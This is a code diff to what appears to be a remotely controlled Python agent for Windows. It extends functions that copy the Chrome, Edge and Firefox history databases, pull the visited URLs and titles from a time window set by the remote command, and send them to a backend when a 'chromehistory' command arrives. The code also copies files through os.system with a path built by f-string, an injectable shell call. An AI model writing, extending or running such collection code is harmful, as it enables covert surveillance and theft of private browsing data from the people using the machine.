@@ -477,7 +477,8 @@ def _epoch_micro_to_datetime(value):
     except Exception:
         return None
 
-def _get_chromium_history(history_path, browser_name, limit=50):
+def _get_chromium_history(history_path, browser_name, limit=100, hours_back=24):
+    """Get recent browser history from Chrome/Edge (last N hours)"""
     if not os.path.exists(history_path):
         return []
     temp_db = f"temp_{browser_name.lower()}_history.db"
@@ -490,11 +491,18 @@ def _get_chromium_history(history_path, browser_name, limit=50):
     rows = []
     conn = None
     try:
+        # Calculate WebKit timestamp threshold (microseconds since 1601-01-01)
+        from datetime import datetime, timedelta
+        cutoff_time = datetime.now() - timedelta(hours=hours_back)
+        # WebKit time: microseconds since 1601-01-01 UTC
+        webkit_epoch = datetime(1601, 1, 1)
+        threshold = int((cutoff_time - webkit_epoch).total_seconds() * 1000000)
+        
         conn = sqlite3.connect(temp_db)
         cursor = conn.cursor()
         cursor.execute(
-            "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?",
-            (limit,)
+            "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time >= ? ORDER BY last_visit_time DESC LIMIT ?",
+            (threshold, limit)
         )
         rows = cursor.fetchall()
     except sqlite3.Error as e:
@@ -519,7 +527,8 @@ def _get_chromium_history(history_path, browser_name, limit=50):
         })
     return results
 
-def _get_firefox_history(limit=50):
+def _get_firefox_history(limit=100, hours_back=24):
+    """Get recent browser history from Firefox (last N hours)"""
     results = []
     profiles_path = os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles\*")
     for profile in glob.glob(profiles_path):
@@ -528,6 +537,11 @@ def _get_firefox_history(limit=50):
             continue
         temp_db = "temp_firefox_history.db"
         try:
+            # Calculate Unix timestamp threshold (microseconds)
+            from datetime import datetime, timedelta
+            cutoff_time = datetime.now() - timedelta(hours=hours_back)
+            threshold = int(cutoff_time.timestamp() * 1000000)
+            
             os.system(f'copy "{history_path}" "{temp_db}"')
             conn = sqlite3.connect(temp_db)
             cursor = conn.cursor()
@@ -536,10 +550,11 @@ def _get_firefox_history(limit=50):
                 SELECT p.url, p.title, v.visit_date
                 FROM moz_places p
                 JOIN moz_historyvisits v ON v.place_id = p.id
+                WHERE v.visit_date >= ?
                 ORDER BY v.visit_date DESC
                 LIMIT ?
                 """,
-                (limit,)
+                (threshold, limit)
             )
             rows = cursor.fetchall()
             conn.close()
@@ -561,13 +576,14 @@ def _get_firefox_history(limit=50):
                 pass
     return results
 
-def get_all_browser_history():
+def get_all_browser_history(hours_back=24):
+    """Get recent browser history from all browsers (default: last 24 hours)"""
     history = []
     chrome_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History")
     edge_path = os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\History")
-    history.extend(_get_chromium_history(chrome_path, "Chrome"))
-    history.extend(_get_chromium_history(edge_path, "Edge"))
-    history.extend(_get_firefox_history())
+    history.extend(_get_chromium_history(chrome_path, "Chrome", hours_back=hours_back))
+    history.extend(_get_chromium_history(edge_path, "Edge", hours_back=hours_back))
+    history.extend(_get_firefox_history(hours_back=hours_back))
     return history
 
 def _get_active_browser():
@@ -879,9 +895,11 @@ def execute_command(cmd):
         
         elif command_type == "chromehistory":
             try:
-                print("🌐 Fetching browser history (Chrome, Edge, Firefox)...")
-                history_list = get_all_browser_history()
-                print(f"✅ Found {len(history_list)} history entries")
+                # Get hours_back parameter (default 24 hours = last day)
+                hours_back = int(params.get("hours_back", 24))
+                print(f"🌐 Fetching browser history from the last {hours_back} hours (Chrome, Edge, Firefox)...")
+                history_list = get_all_browser_history(hours_back=hours_back)
+                print(f"✅ Found {len(history_list)} history entries from the last {hours_back} hours")
                 
                 # Send to backend (NEW)
                 send_browser_history_to_backend(history_list)
